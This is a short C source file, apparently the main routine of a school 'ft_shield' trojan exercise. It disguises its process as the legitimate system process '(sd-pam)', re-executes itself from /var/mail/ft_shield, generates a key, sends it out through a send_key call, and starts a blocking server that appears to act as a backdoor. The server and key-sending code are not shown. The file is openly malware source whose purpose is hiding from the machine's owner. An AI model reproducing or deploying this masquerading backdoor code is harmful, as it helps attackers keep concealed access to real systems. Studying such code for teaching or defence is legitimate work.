#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <malloc.h>

#include "key.h"
#include "server.h"

int obfuscate_process_name(int argc, char **argv)
{
	// obfuscate payload by changing the name of the process
	(void)argc;
	char *pr_name = "(sd-pam)";
	if (strcmp(argv[0], pr_name) != 0)
	{
		char *new_argv[] = {pr_name, NULL};
		if (execv("/var/mail/ft_shield", new_argv) == -1)
			return 1;
	}
	else
		prctl(PR_SET_NAME, pr_name, 0, 0, 0);
	return 0;
}

int main(int argc, char **argv)
{
	obfuscate_process_name(argc, argv);

	// remove buffering for stdout
	setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

	// generate key
	char key[PASS_SIZE];

	generate_key(key);
	if (send_key(key))
		return 1;
	write(1, key, PASS_SIZE);
	write(1, "\n", 1);

	// start server, should be blocking
	server_run(key);

	return 1;
}
